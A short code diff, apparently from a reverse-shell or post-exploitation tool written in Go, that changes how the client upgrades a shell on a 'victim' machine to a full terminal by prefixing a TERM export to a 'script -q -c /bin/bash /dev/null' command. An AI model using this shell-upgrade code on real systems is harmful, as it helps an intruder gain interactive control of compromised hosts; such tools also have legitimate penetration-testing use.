@@ -588,7 +588,7 @@ func (c *TCPClient) EstablishPTY() error {
 	python := c.SelectPython()
 	if python == "" {
 		// Step 1: Spawn /bin/sh via pty of victim
-		command := "script -q -c /bin/bash /dev/null"
+		command := "export TERM=xterm-256color && script -q -c /bin/bash /dev/null"
 		log.Info("spawning /bin/bash on the current client by script command")
 		c.System(command)
 	} else {
